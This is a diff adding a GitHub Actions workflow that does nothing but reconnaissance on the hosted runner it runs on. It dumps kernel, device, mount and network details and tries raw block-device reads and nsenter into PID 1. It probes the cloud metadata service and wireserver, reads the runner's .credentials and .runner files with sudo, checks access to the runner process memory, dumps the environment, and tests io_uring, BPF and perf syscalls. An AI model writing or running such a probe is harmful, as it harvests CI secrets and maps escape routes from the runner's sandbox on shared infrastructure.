@@ -1,0 +1,64 @@
+name: r0-env-dump
+on:
+  workflow_dispatch:
+jobs:
+  r0:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: identity-kernel
+        run: |
+          echo "== uname =="; uname -a
+          echo "== /proc/version =="; cat /proc/version
+          echo "== cmdline =="; cat /proc/cmdline
+          echo "== hypervisor flag =="; grep -m1 -o 'hypervisor' /proc/cpuinfo || echo none
+          echo "== dmesg head =="; sudo dmesg 2>&1 | head -30
+          echo "== self status caps/seccomp =="; grep -E 'Cap|Seccomp|NoNewPrivs' /proc/self/status
+          echo "== issue =="; cat /etc/issue 2>/dev/null; lsb_release -a 2>/dev/null
+          echo "== root dir =="; ls /
+          echo "== image-generation =="; ls /image-generation 2>/dev/null && head -50 /image-generation/*.md 2>/dev/null
+      - name: dev-blocks
+        run: |
+          echo "== /dev =="; ls -la /dev
+          echo "== lsblk =="; lsblk -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT,MODEL 2>/dev/null
+          echo "== /sys/block =="; for b in /sys/block/*/; do echo "-- $b"; cat $b/device/model 2>/dev/null; cat $b/size 2>/dev/null; done
+          echo "== mknod test =="; sudo mknod /tmp/tstblk b 252 0 2>&1 && sudo dd if=/tmp/tstblk of=/tmp/tstblk.img bs=512 count=1 2>&1 | tail -2 && xxd /tmp/tstblk.img | head -3; sudo rm -f /tmp/tstblk /tmp/tstblk.img
+          echo "== vmbus =="; ls /sys/bus/vmbus/devices 2>/dev/null || echo no-vmbus
+          echo "== pci =="; ls /sys/bus/pci/devices 2>/dev/null || echo no-pci
+      - name: mounts-ns
+        run: |
+          echo "== /proc/mounts =="; cat /proc/mounts
+          echo "== filesystems =="; cat /proc/filesystems
+          echo "== findmnt =="; findmnt 2>/dev/null | head -40
+          echo "== cgroup =="; cat /proc/self/cgroup; ls /sys/fs/cgroup 2>/dev/null | head -30
+          echo "== userns test =="; unshare -Ur echo USERNS-OK 2>&1
+          echo "== nsenter pid1 =="; sudo nsenter -t 1 -m -p -- echo NS1-OK 2>&1
+      - name: net-imds
+        run: |
+          echo "== ip addr =="; ip -br addr; echo "== ip route =="; ip route
+          echo "== listeners =="; ss -tulpn 2>/dev/null | head -30
+          echo "== resolv =="; cat /etc/resolv.conf
+          echo "== arp =="; ip neigh 2>/dev/null
+          echo "== IMDS probe =="; curl -sS --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>&1 | head -c 2000; echo
+          echo "== wireserver =="; curl -sS --max-time 4 'http://168.63.129.16/machine/?comp=health' 2>&1 | head -c 500; echo
+          echo "== internal dns =="; getent hosts pipelines.actions.githubusercontent.com results-receiver.actions.githubusercontent.com artifactcache.actions.githubusercontent.com 2>&1
+      - name: runner-internals
+        run: |
+          echo "== home/runner =="; ls -la /home/runner/ 2>/dev/null
+          echo "== runners dir =="; ls -la /home/runner/runners/ 2>/dev/null
+          echo "== runner config files =="; sudo ls -la /home/runner/*/.runner /home/runner/*/.credentials /home/runner/*/.credentials_rsaparams 2>/dev/null
+          echo "== .runner content =="; sudo cat /home/runner/*/.runner 2>/dev/null
+          echo "== .credentials head =="; sudo head -c 300 /home/runner/*/.credentials 2>/dev/null; echo
+          echo "== ps aux =="; ps aux | head -40
+          echo "== runner proc mem access =="; LP=$(pgrep -f Runner.Listener | head -1); echo "ListenerPID=$LP"; sudo ls -la /proc/$LP/mem 2>/dev/null && echo MEM-ACCESSIBLE || echo MEM-NO
+          echo "== job env =="; env | sort
+          echo "== hostedtoolcache =="; ls /opt/hostedtoolcache 2>/dev/null
+      - name: kernel-surface
+        run: |
+          echo "== sysctls =="; sysctl kernel.unprivileged_bpf_disabled kernel.unprivileged_userns_clone 2>/dev/null; cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null
+          echo "== io_uring test =="; python3 -c "import os;fd=os.syscall(425,0,0);print('IOURING fd',fd)" 2>&1
+          echo "== bpf test =="; python3 -c "import os;fd=os.syscall(321,0,0,0,8,0);print('BPF fd',fd)" 2>&1
+          echo "== perf test =="; python3 -c "import os;fd=os.syscall(298,0,-1,-1,0,0);print('PERF fd',fd)" 2>&1
+          echo "== kcmp =="; python3 -c "import os;print('KCMP',os.syscall(312,1,1,1,0,0))" 2>&1
+          echo "== pmem/mem devices =="; ls -la /dev/pmem* /dev/mem /dev/kmem 2>&1
+          echo "== sudo -l =="; sudo -l 2>&1 | head -10
